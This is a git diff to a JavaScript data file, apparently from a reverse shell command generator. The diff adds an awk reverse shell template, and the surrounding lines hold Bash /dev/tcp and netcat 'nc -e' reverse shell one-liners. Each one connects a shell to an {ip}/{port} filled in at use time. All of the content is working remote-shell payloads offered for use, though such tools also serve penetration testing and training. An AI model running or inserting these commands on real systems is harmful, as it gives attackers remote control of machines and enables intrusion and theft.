@@ -10,6 +10,7 @@ const rsgData = {
     shells: ['sh', 'bash', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
 
     reverseShellsCommands: [
+        ['awk', 'awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'],
         ['Bash #1', '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1'],
         ['Bash #2', '0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196'],
         ['nc #1', 'nc -e /bin/{shell} {ip} {port}'],
